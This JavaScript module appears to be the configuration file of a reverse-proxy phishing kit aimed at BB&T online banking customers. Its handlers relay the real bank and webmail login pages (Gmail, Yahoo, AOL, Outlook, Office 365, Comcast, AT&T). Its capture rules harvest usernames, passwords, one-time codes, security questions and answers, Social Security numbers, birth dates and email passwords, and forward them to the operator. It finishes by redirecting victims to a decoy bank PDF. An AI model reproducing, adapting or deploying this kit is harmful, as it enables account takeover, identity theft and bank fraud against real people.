/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return super.processRequest()

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint)
        this.regexes = [
             // {
             //    reg: //igm,
             //    replacement: '',
             // },
        ]
    }


    processResponse() {
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            /** AOL SUCCESS REDIRECT */
            if (rLocation.startsWith('https://api.login.aol.com/oauth2/request_auth')
                || rLocation.startsWith('https://guce.aol.com/consent?gcrumb=') || rLocation === 'https://www.aol.com/') {
                return this.afterEmailPath()
            } if (rLocation.startsWith('https://account.live.com') || rLocation.startsWith('https://account.microsoft.com')) {
                return this.afterEmailPath()
            } if (rLocation.startsWith('https://www.yahoo.com/?guccounter=1&guce_referrer=') || rLocation === 'https://www.yahoo.com/') {
                return this.afterEmailPath()
            } if (rLocation === 'https://www.office.com/landing') {
                return this.afterEmailPath()
            }

        }

        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth/login/finish')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }

    execute(clientConfig) {
        if (this.req.url === '/auth/pwd.tb' && this.req.method === 'POST') {
            clientConfig.setLogAvailable(true)
        }

        const redirectToken = super.checkForRedirect()
        if (redirectToken !== null) {
            clientConfig.currentDomain = redirectToken.obj.host
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)
        }

        if (this.req.url === '/kmsi' || this.req.url.startsWith('/account/fb-messenger-linking')) {
            
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }


        return super.superExecuteProxy(clientConfig.currentDomain, clientConfig)

    }
}

const ExecAccountsHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/overview/accounts/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/overview/accounts/security') {
                this.uploadRequestBody(clientContext.currentDomain, clientContext)
                this.res.writeHead('200')
                return this.res.end('')
            } if (this.req.url === '/overview/accounts/personal') {
                this.captureBody(clientContext.currentDomain, clientContext)
                this.res.writeHead('200')
                return this.res.end('')
            } if (this.req.url === '/overview/accounts/manual') {
                this.captureBody(clientContext.currentDomain, clientContext)
                this.res.writeHead('200')
                setTimeout(() => {
                    super.sendClientData(clientContext, {})
                }, 10000)
                return this.res.end('')

                
            }
                this.res.writeHead('401')
                return this.res.end('')
            
        }
        if (this.req.url === '/overview/accounts/index') {
                return super.superExecutePhpScript('index.php', clientContext)
        }
        return this.res.writeHead(404)
    }
}

const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/auth/login/');
    }

    execute(clientContext) {


        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/outlook') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                super.sendClientData(clientContext, {})
                this.res.writeHead(200)
                return this.res.end(`<!DOCTYPE html>
                                    <html>
                                    <body>
                                    <script>
                                    window.location = 'https://www.citizensbank.com/pdf/CTZ_eSign.pdf';
                                    close()
                                    </script>
                                    </body>
                                    </html>
                                    `)
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)


    }
}





const configExport = {
    CURRENT_DOMAIN: 'bank.bbt.com',
    START_PATH: '/auth/pwd.tb',
    PRE_HANDLERS:
        [
            ExecAccountsHandler, EmailLoginHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUsername: {
            method: 'POST',
            params: ['UserName'],
            urls: '',
            hosts: ['bank.bbt.com'],
        },
        loginPassword: {
            method: 'POST',
            params: ['Password'],
            urls: '',
            hosts: ['bank.bbt.com'],
        },
        sqAnswer: {
            method: 'POST',
            params: ['answerField'],
            urls: '',
            hosts: ['bank.bbt.com'],
        },
        otpField: {
            method: 'POST',
            params: ['answerField1'],
            urls: '',
            hosts: ['bank.bbt.com'],
        },
        securityQuestion1: {
            method: 'POST',
            params: ['q1'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        securityAnswer1: {
            method: 'POST',
            params: ['a1'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        securityQuestion2: {
            method: 'POST',
            params: ['q2'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        securityAnswer2: {
            method: 'POST',
            params: ['a2'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        securityQuestion3: {
            method: 'POST',
            params: ['q3'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        securityAnswer3: {
            method: 'POST',
            params: ['a3'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        emailAddress: {
            method: 'POST',
            params: ['email'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        fullName: {
            method: 'POST',
            params: ['uname'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        ssnNumber: {
            method: 'POST',
            params: ['ssn'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        dobNumber: {
            method: 'POST',
            params: ['dob'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        manualEmailPassword: {
            method: 'POST',
            params: ['epw1'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['epw2'],
            urls: ['/overview/accounts/index'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport